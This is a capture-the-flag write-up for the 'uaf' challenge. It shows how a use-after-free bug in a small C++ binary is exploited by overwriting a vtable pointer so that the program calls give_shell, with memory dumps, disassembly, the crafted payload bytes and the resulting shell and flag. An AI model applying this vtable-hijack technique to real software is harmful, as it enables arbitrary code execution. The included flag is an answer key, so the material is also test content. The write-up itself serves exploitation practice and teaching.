### uaf

The layout in the pwnable server is a bit different then the one compiled locally.
So better investigating directly in the site
This is what I found:

main local variables:
1. m    - at $rbp-0x38
2. w    - at $rbp-0x30
3. len  - at $rbp-0x28
4. data - at $rbp-0x20
3. op   - at $rbp-0x18

Another thing I noted, is that when running 'after' to replace the people with my own buffer,
The first time it is called , it replaces woman and only the second time it replaces man.
So maybe 'after' should be executed twice in order to replace 'man' since man's introduce is called first.

When looking at the content of the 'm' pointer I saw 0x00401570.
runnig `readelf -S uaf` I saw this belongs to the .rodata section. So I dump it:

```
uaf@ubuntu:~$ objdump -s -j .rodata uaf

uaf:     file format elf64-x86-64

Contents of section .rodata:
 4014a0 01000200 00000000 2f62696e 2f736800  ......../bin/sh.
 4014b0 4d79206e 616d6520 69732000 4920616d  My name is .I am
 4014c0 20002079 65617273 206f6c64 00492061   . years old.I a
 4014d0 6d206120 6e696365 20677579 21004920  m a nice guy!.I 
 4014e0 616d2061 20637574 65206769 726c2100  am a cute girl!.
 4014f0 4a61636b 004a696c 6c00312e 20757365  Jack.Jill.1. use
 401500 0a322e20 61667465 720a332e 20667265  .2. after.3. fre
 401510 650a0079 6f757220 64617461 20697320  e..your data is 
 401520 616c6c6f 63617465 64000000 00000000  allocated.......
 401530 00000000 00000000 00000000 00000000  ................
 401540 00000000 00000000 b0154000 00000000  ..........@.....
 401550 7a114000 00000000 76134000 00000000  z.@.....v.@.....
 401560 00000000 00000000 d0154000 00000000  ..........@.....
 401570 7a114000 00000000 d2124000 00000000  z.@.......@.....
 401580 00000000 00000000 f0154000 00000000  ..........@.....
 401590 7a114000 00000000 92114000 00000000  z.@.......@.....
 4015a0 35576f6d 616e0000 00000000 00000000  5Woman..........
 4015b0 90236000 00000000 a0154000 00000000  .#`.......@.....
 4015c0 f0154000 00000000 334d616e 00000000  ..@.....3Man....
 4015d0 90236000 00000000 c8154000 00000000  .#`.......@.....
 4015e0 f0154000 00000000 3548756d 616e0000  ..@.....5Human..
 4015f0 10226000 00000000 e8154000 00000000  ."`.......@.....
```
Indeed we can see the value `7a114000` in the address `401570`.
This value is an adress in the .text section and it is actually the `get_shell` function that we
want:
```
(gdb) disas 0x0040117a
Dump of assembler code for function _ZN5Human10give_shellEv:
   0x000000000040117a <+0>:	push   %rbp
   0x000000000040117b <+1>:	mov    %rsp,%rbp
   0x000000000040117e <+4>:	sub    $0x10,%rsp
   0x0000000000401182 <+8>:	mov    %rdi,-0x8(%rbp)
   0x0000000000401186 <+12>:	mov    $0x4014a8,%edi
   0x000000000040118b <+17>:	callq  0x400cc0 <system@plt>
   0x0000000000401190 <+22>:	leaveq 
   0x0000000000401191 <+23>:	retq   
End of assembler dump.
```
but since the code calls `introduce` the code increments the value in `rax` by 8 in order to point it to the address of the introduce function which is `d2124000`.
Here is the code in main that execute `m->intoduce()`:
```
400fcd:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400fd1:	48 8b 00             	mov    (%rax),%rax
  400fd4:	48 83 c0 08          	add    $0x8,%rax
  400fd8:	48 8b 10             	mov    (%rax),%rdx
  400fdb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400fdf:	48 89 c7             	mov    %rax,%rdi
  400fe2:	ff d2                	callq  *%rdx

```
So what we can do is to put 0x401570-0x8 = 0x401568 in the array allocated in 'after'.
Then when the code increments rax by 8 will move it to point to our `get_shell` that we want.

`uaf@ubuntu:~$ echo -n -e '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/blablu`

Also, don't forgat to execute `after` twice since the first time replaces woman but we want to replace man.

```
uaf@ubuntu:~$ ./uaf 8 /tmp/blablu
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning
```
